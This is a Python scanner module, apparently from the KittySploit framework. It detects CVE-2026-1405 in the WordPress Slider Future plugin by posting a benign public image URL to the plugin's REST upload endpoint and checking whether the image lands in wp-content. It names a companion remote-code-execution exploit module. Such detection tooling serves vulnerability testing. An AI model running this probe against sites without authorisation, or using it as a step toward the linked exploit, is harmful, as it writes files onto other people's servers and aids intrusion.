#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Slider Future <= 1.0.5 REST image upload SSRF (CVE-2026-1405)."""

import json

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress

_PLUGIN = "slider-future"
_VULN_HIGH = (1, 0, 5)


class Module(Scanner, Http_client, Wordpress):
    __info__ = {
        "name": "Slider Future CVE-2026-1405 upload detect",
        "description": (
            "Detects CVE-2026-1405: POST /wp-json/slider-future/v1/upload-image/ fetches "
            "remote image_url and stores under wp-content."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": "CVE-2026-1405",
        "modules": ["exploits/multi/http/slider_future_cve_2026_1405_upload_rce"],
        "tags": ["web", "scanner", "wordpress", "slider-future", "file-upload", "cve-2026-1405"],
    }

    base_path = OptString("/", "WordPress base path", required=False)

    def _join(self, suffix: str) -> str:
        base = self.wp_normalize_base_path(self.base_path or "/")
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base != "/" else suffix

    def run(self):
        version = self.wp_plugin_version(_PLUGIN, self.wp_normalize_base_path(self.base_path or "/")) or ""
        if version and not self.wp_version_in_range(version, (0, 0, 0), _VULN_HIGH):
            return False
        # 1x1 PNG (public) — plugin should mirror into uploads
        image_url = "https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png"
        r = self.http_request(
            method="POST",
            path=self._join("/wp-json/slider-future/v1/upload-image/"),
            headers={"Content-Type": "application/json"},
            data=json.dumps({"image_url": image_url}),
            allow_redirects=False,
        )
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        if "wp-content" in body and "url" in body:
            self.set_info(
                severity="critical",
                reason="Slider Future CVE-2026-1405 — remote image import to wp-content",
                path="/wp-json/slider-future/v1/upload-image/",
                cve="CVE-2026-1405",
            )
            return True
        return False
